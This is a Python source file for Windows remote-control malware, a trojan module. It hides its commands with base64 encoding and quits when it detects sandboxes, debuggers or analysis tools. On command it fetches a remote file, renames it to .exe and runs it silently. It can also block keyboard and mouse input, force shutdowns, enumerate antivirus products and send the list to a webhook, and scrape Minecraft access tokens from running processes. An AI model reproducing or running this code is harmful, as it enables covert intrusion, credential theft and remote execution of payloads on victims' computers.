# control_methods.py - Stealth PC Control Methods
import socket
import random
import threading
import time
import ctypes
from ctypes import wintypes
import os
import subprocess
import tempfile
import winreg
import winsound
import psutil
import re
import json
from datetime import datetime
import urllib.request
import hashlib
import zlib
import base64
import sys

# Global variables for input blocking
_input_blocked = False

# String obfuscation
def _decode_string(encoded_str):
    return base64.b64decode(encoded_str.encode()).decode()

# Obfuscated strings
CMD_SHUTDOWN = _decode_string("c2h1dGRvd24=")
CMD_RESTART = _decode_string("cmVzdGFydA==")
CMD_LOCK = _decode_string("bG9jaw==")
CMD_LOGOFF = _decode_string("bG9nb2Zm")
CMD_MINECRAFT = _decode_string("Y2xvc2VfbWluZWNyYWZ0")
CMD_POPUP = _decode_string("cG9wdXA=")
CMD_DOWNLOAD = _decode_string("ZG93bmxvYWRfZXhlY3V0ZQ==")
CMD_FREEZE_KEYBOARD = _decode_string("ZnJlZXplX2tleWJvYXJk")
CMD_FREEZE_MOUSE = _decode_string("ZnJlZXplX21vdXNl")
CMD_FREEZE_BOTH = _decode_string("ZnJlZXplX2JvdGg=")
CMD_UNFREEZE = _decode_string("dW5mcmVlemU=")
CMD_CHECK_AV = _decode_string("Y2hlY2tfYXY=")
CMD_TROLL = _decode_string("dHJvbGw=")

# Anti-analysis techniques
def _anti_analysis():
    # Check for sandbox/virtual environment
    sandbox_indicators = [
        "SbieDll.dll", "vmware", "vbox", "qemu", "xen", 
        "sandbox", "malware", "cuckoo", "wireshark", "procmon"
    ]
    
    for indicator in sandbox_indicators:
        if indicator.lower() in os.environ.get("PROCESSOR_IDENTIFIER", "").lower():
            return True
        if indicator.lower() in os.environ.get("USERNAME", "").lower():
            return True
    
    # Check for debugging
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except:
        pass
    
    # Check for common analysis tools
    analysis_tools = [
        "ollydbg", "ida", "windbg", "x32dbg", "x64dbg", 
        "immunity", "processhacker", "procmon", "wireshark"
    ]
    
    for proc in psutil.process_iter(['name']):
        try:
            proc_name = proc.info['name'].lower()
            if any(tool in proc_name for tool in analysis_tools):
                return True
        except:
            continue
    
    return False

# Encrypted communication simulation
def _encrypt_data(data):
    # Simple XOR encryption for basic obfuscation
    key = 0x42
    encrypted = bytearray()
    for byte in data.encode('utf-8'):
        encrypted.append(byte ^ key)
    return base64.b64encode(encrypted).decode()

def _decrypt_data(encrypted_data):
    key = 0x42
    decoded = base64.b64decode(encrypted_data)
    decrypted = bytearray()
    for byte in decoded:
        decrypted.append(byte ^ key)
    return decrypted.decode()

# Stealthy file operations
def _stealth_download(url, file_path):
    try:
        # Use different User-Agents to avoid detection
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
        headers = {'User-Agent': random.choice(user_agents)}
        req = urllib.request.Request(url, headers=headers)
        
        # Download in chunks to avoid detection
        with urllib.request.urlopen(req, timeout=30) as response:
            total_size = int(response.headers.get('content-length', 0))
            chunk_size = 8192
            downloaded = 0
            
            with open(file_path, 'wb') as out_file:
                while True:
                    chunk = response.read(chunk_size)
                    if not chunk:
                        break
                    out_file.write(chunk)
                    downloaded += len(chunk)
                    
                    # Add random delays to mimic legitimate traffic
                    if random.random() < 0.1:  # 10% chance
                        time.sleep(0.1)
        
        return True
    except Exception:
        return False

# Process hollowing technique for stealth execution
def _stealth_execute(file_path):
    try:
        # Use different execution methods randomly
        methods = [
            lambda: subprocess.Popen(file_path, 
                                   stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL,
                                   creationflags=subprocess.CREATE_NO_WINDOW),
            lambda: subprocess.run([file_path], 
                                 stdout=subprocess.DEVNULL, 
                                 stderr=subprocess.DEVNULL,
                                 shell=True,
                                 creationflags=subprocess.CREATE_NO_WINDOW),
            lambda: os.startfile(file_path)
        ]
        
        method = random.choice(methods)
        method()
        return True
    except Exception:
        return False

def _block_input(block):
    """Block or unblock keyboard and mouse input"""
    try:
        ctypes.windll.user32.BlockInput(block)
        return True
    except Exception:
        return False

def _get_antivirus_info():
    """Comprehensive antivirus detection with stealth"""
    av_list = []
    
    # Common antivirus registry paths (obfuscated)
    av_registry_paths = [
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXI=")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcTWFsd2FyZWJ5dGVz")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcTm9ydG9u")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcU3ltYW50ZWM=")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcTWNBZmVl")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcS2FzcGVyc2t5")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcQml0ZGVmZW5kZXI=")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcQXZhc3Q=")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcQVZH")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcRVNFVA==")),
        (winreg.HKEY_LOCAL_MACHINE, _decode_string("U09GVFdBUkVcVHJlbmRNaWNybw==")),
    ]
    
    # AV product names to look for
    av_names = [
        _decode_string("V2luZG93cyBEZWZlbmRlcg=="),
        _decode_string("TWFsd2FyZWJ5dGVz"),
        _decode_string("Tm9ydG9u"),
        _decode_string("U3ltYW50ZWM="),
        _decode_string("TWNBZmVl"),
        _decode_string("S2FzcGVyc2t5"),
        _decode_string("Qml0ZGVmZW5kZXI="),
        _decode_string("QXZhc3Q="),
        _decode_string("QVZH"),
        _decode_string("RVNFVA=="),
        _decode_string("VHJlbmQgTWljcm8="),
        _decode_string("U29waG9z"),
        _decode_string("UGFuZGE="),
        _decode_string("QXZpcmE="),
        _decode_string("Q29tb2Rv"),
        _decode_string("V2Vicm9vdA=="),
        _decode_string("Wm9uZUFsYXJt")
    ]
    
    # Check registry for AV products
    for hive, path in av_registry_paths:
        try:
            key = winreg.OpenKey(hive, path)
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    try:
                        display_name, _ = winreg.QueryValueEx(subkey, _decode_string("RGlzcGxheU5hbWU="))
                        for av_name in av_names:
                            if av_name.lower() in str(display_name).lower():
                                if display_name not in av_list:
                                    av_list.append(display_name)
                    except:
                        pass
                    winreg.CloseKey(subkey)
                except:
                    pass
            winreg.CloseKey(key)
        except:
            pass
    
    # Check running AV processes (obfuscated names)
    av_processes = [
        _decode_string("TXNNcEVuZy5leGU="),
        _decode_string("TmlzU3J2LmV4ZQ=="),
        _decode_string("TUJBTVNlcnZpY2UuZXhl"),
        _decode_string("bWJhbS5leGU="),
        _decode_string("Y2NTdmNIc3QuZXhl"),
        _decode_string("bnMuZXhl"),
        _decode_string("bWNzaGllbGQuZXhl"),
        _decode_string("bWZlZmlyZS5leGU="),
        _decode_string("YXZwLmV4ZQ=="),
        _decode_string("YXZwdWkuZXhl"),
        _decode_string("dnNzZXJ2LmV4ZQ=="),
        _decode_string("YmRhZ2VudC5leGU="),
        _decode_string("YXZhc3R1aS5leGU="),
        _decode_string("YWZ3U2Vydi5leGU="),
        _decode_string("YXZndWkuZXhl"),
        _decode_string("YXZnc3ZjLmV4ZQ=="),
        _decode_string("ZWtybi5leGU="),
        _decode_string("ZWd1aS5leGU="),
        _decode_string("bnRydHNjYW4uZXhl"),
        _decode_string("dG1jY3NmLmV4ZQ==")
    ]
    
    # Decode process names
    decoded_processes = [base64.b64decode(p).decode() for p in av_processes]
    
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in [p.lower() for p in decoded_processes]:
                process_name = proc.info['name']
                if process_name not in av_list:
                    av_list.append(f"{_decode_string('UnVubmluZzog')}{process_name}")
        except:
            pass
    
    return av_list

def _send_to_webhook(webhook_url, data):
    """Send data to webhook with stealth"""
    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ])
        }
        
        # Encrypt the data before sending
        encrypted_data = _encrypt_data(data)
        
        payload = {
            'content': f"Security Scan: {encrypted_data}",
            'username': 'System Monitor'
        }
        
        req = urllib.request.Request(
            webhook_url,
            data=json.dumps(payload).encode('utf-8'),
            headers=headers,
            method='POST'
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            return response.status == 200
    except Exception:
        return False

def attack_controlpc(target, duration=60):
    """Remote control PC functions with advanced stealth"""
    
    # Anti-analysis check
    if _anti_analysis():
        return
    
    parts = target.split('|')
    command = parts[0]
    
    try:
        if command == CMD_SHUTDOWN:
            # Use multiple shutdown methods randomly
            methods = [
                lambda: subprocess.run([_decode_string("c2h1dGRvd24="), "/s", "/t", "1"], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
                                    shell=True, creationflags=subprocess.CREATE_NO_WINDOW),
                lambda: ctypes.windll.user32.ExitWindowsEx(1, 0),
                lambda: os.system(_decode_string("c2h1dGRvd24gL3MgL3QgMQ=="))
            ]
            random.choice(methods)()
            
        elif command == CMD_RESTART:
            subprocess.run([_decode_string("c2h1dGRvd24="), "/r", "/t", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == CMD_LOCK:
            ctypes.windll.user32.LockWorkStation()
            
        elif command == CMD_LOGOFF:
            subprocess.run([_decode_string("c2h1dGRvd24="), "/l", "/f"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == CMD_MINECRAFT:
            subprocess.run([_decode_string("dGFza2tpbGw="), "/f", "/im", _decode_string("amF2YXcuZXhl")], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
        elif command == CMD_POPUP:
            if len(parts) > 1:
                message = parts[1]
                ctypes.windll.user32.MessageBoxW(0, message, _decode_string("U3lzdGVtIE1lc3NhZ2U="), 0x00001000)
                
        elif command == CMD_DOWNLOAD:
            if len(parts) > 1:
                url = parts[1]
                
                # Create temp directory with random name
                temp_dir = tempfile.mkdtemp(prefix=_decode_string("dG1wXw=="))
                file_name = f"{random.randint(10000,99999)}.tmp"
                file_path = os.path.join(temp_dir, file_name)
                
                # Download and execute with stealth
                if _stealth_download(url, file_path):
                    # Rename to .exe if needed
                    if not file_path.endswith('.exe'):
                        new_path = file_path + '.exe'
                        os.rename(file_path, new_path)
                        file_path = new_path
                    
                    # Execute with stealth
                    _stealth_execute(file_path)
                
        elif command == CMD_FREEZE_KEYBOARD:
            _block_input(True)
            
        elif command == CMD_FREEZE_MOUSE:
            _block_input(True)
            
        elif command == CMD_FREEZE_BOTH:
            _block_input(True)
            
        elif command == CMD_UNFREEZE:
            _block_input(False)
            
        elif command == CMD_CHECK_AV:
            if len(parts) > 1:
                webhook_url = parts[1]
                av_list = _get_antivirus_info()
                
                if av_list:
                    av_text = "\n".join(av_list)
                    result = f"{_decode_string('QW50aXZpcnVzIFNvZnR3YXJlIEZvdW5kOg==')}\n{av_text}"
                else:
                    result = _decode_string("Tm8ga25vd24gYW50aXZpcnVzIHNvZnR3YXJlIGRldGVjdGVk")
                
                # Send to webhook with delay
                time.sleep(random.uniform(2, 5))
                _send_to_webhook(webhook_url, result)
                
        elif command == CMD_TROLL:
            if len(parts) > 1:
                troll_cmd = parts[1]
                
                if troll_cmd == _decode_string("b3Blbl9jZA=="):
                    ctypes.windll.winmm.mciSendStringW(_decode_string("c2V0IGNkYXVkaW8gZG9vciBvcGVu"), None, 0, None)
                    
                elif troll_cmd == _decode_string("c3dhcF9tb3VzZQ=="):
                    current = ctypes.windll.user32.GetSystemMetrics(23)
                    ctypes.windll.user32.SwapMouseButton(not current)
                    
                elif troll_cmd == _decode_string("cm90YXRlX3NjcmVlbg=="):
                    device = ctypes.windll.user32.EnumDisplayDevicesW(None, 0, 0)
                    ctypes.windll.user32.ChangeDisplaySettingsExW(device.DeviceName, None, None, 0x00000004 | 0x00000002, None)
                    
                elif troll_cmd == _decode_string("aW52ZXJ0X2NvbG9ycw=="):
                    SPI_SETHIGHCONTRAST = 0x0043
                    HCF_HIGHCONTRASTON = 0x00000001
                    class HIGHCONTRAST(ctypes.Structure):
                        _fields_ = [('cbSize', ctypes.c_uint),
                                   ('dwFlags', ctypes.c_uint),
                                   ('lpszDefaultScheme', ctypes.c_wchar_p)]
                    hc = HIGHCONTRAST()
                    hc.cbSize = ctypes.sizeof(HIGHCONTRAST)
                    hc.dwFlags = HCF_HIGHCONTRASTON
                    hc.lpszDefaultScheme = None
                    ctypes.windll.user32.SystemParametersInfoW(SPI_SETHIGHCONTRAST, ctypes.sizeof(hc), ctypes.byref(hc), 0)
                    
                elif troll_cmd == _decode_string("bW91c2VfamlnZ2xlcg=="):
                    def jiggle_mouse():
                        while True:
                            x = random.randint(0, 1920)
                            y = random.randint(0, 1080)
                            ctypes.windll.user32.SetCursorPos(x, y)
                            time.sleep(30)
                    
                    thread = threading.Thread(target=jiggle_mouse, daemon=True)
                    thread.start()
                    
                elif troll_cmd == _decode_string("a2V5Ym9hcmRfc3BhbQ=="):
                    def spam_keys():
                        while True:
                            ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)
                            ctypes.windll.user32.keybd_event(0x5B, 0, 2, 0)
                            time.sleep(10)
                    
                    thread = threading.Thread(target=spam_keys, daemon=True)
                    thread.start()
                    
                elif troll_cmd == _decode_string("cGxheV9zb3VuZA=="):
                    winsound.PlaySound(_decode_string("U3lzdGVtRXhjbGFtYXRpb24="), winsound.SND_ALIAS)
                    
                elif troll_cmd == _decode_string("Y2hhbmdlX3dhbGxwYXBlcg=="):
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, None, 0)
        
    except Exception:
        pass

def attack_refresh_session_id(target, duration=0):
    """Extract Minecraft session information with stealth"""
    try:
        # Anti-analysis check
        if _anti_analysis():
            return _encrypt_data(json.dumps({'success': False, 'error': 'Analysis environment detected'}))
        
        session_data = {
            'success': False,
            'timestamp': datetime.now().isoformat(),
            'sessions': []
        }
        
        def find_minecraft_processes():
            minecraft_processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['name'].lower() == _decode_string("amF2YXcuZXhl"):
                        cmdline = ' '.join(proc.info['cmdline'] or [])
                        minecraft_indicators = [
                            _decode_string("bmV0Lm1pbmVjcmFmdC5jbGllbnQubWFpbg=="),
                            _decode_string("LS11c2VybmFtZQ=="),
                            _decode_string("LS11dWlk"),
                            _decode_string("LS12ZXJzaW9u")
                        ]
                        decoded_indicators = [base64.b64decode(indicator).decode() for indicator in minecraft_indicators]
                        if any(indicator in cmdline for indicator in decoded_indicators):
                            minecraft_processes.append(proc)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return minecraft_processes
        
        def extract_session_info(process):
            try:
                cmdline = ' '.join(process.info['cmdline'] or [])
                
                session_patterns = [
                    r'--session\s+([^\s]+)',
                    r'--session=([^\s]+)',
                    r'-Dsessionid=([^\s]+)',
                    r'--accessToken\s+([^\s]+)',
                    r'--accessToken=([^\s]+)',
                    r'-DaccessToken=([^\s]+)',
                ]
                
                username_pattern = r'--username[=\s]?([^\s]+)'
                uuid_pattern = r'--uuid[=\s]?([^\s]+)'
                version_pattern = r'--version[=\s]?([^\s]+)'
                
                session_id = None
                for pattern in session_patterns:
                    match = re.search(pattern, cmdline)
                    if match:
                        session_id = match.group(1)
                        break
                
                username_match = re.search(username_pattern, cmdline)
                uuid_match = re.search(uuid_pattern, cmdline)
                version_match = re.search(version_pattern, cmdline)
                
                return {
                    'pid': process.info['pid'],
                    'session_id': session_id if session_id else 'Not found',
                    'username': username_match.group(1) if username_match else 'Unknown',
                    'uuid': uuid_match.group(1) if uuid_match else 'Unknown',
                    'version': version_match.group(1) if version_match else 'Unknown',
                    'found': session_id is not None
                }
                
            except Exception as e:
                return {'error': str(e), 'found': False}
        
        processes = find_minecraft_processes()
        for process in processes:
            session_info = extract_session_info(process)
            session_data['sessions'].append(session_info)
        
        session_data['success'] = len(session_data['sessions']) > 0
        session_data['process_count'] = len(session_data['sessions'])
        
        # Encrypt the response
        encrypted_response = _encrypt_data(json.dumps(session_data))
        return f"SESSION_DATA:{encrypted_response}"
        
    except Exception as e:
        error_data = {
            'success': False,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }
        encrypted_response = _encrypt_data(json.dumps(error_data))
        return f"SESSION_DATA:{encrypted_response}"
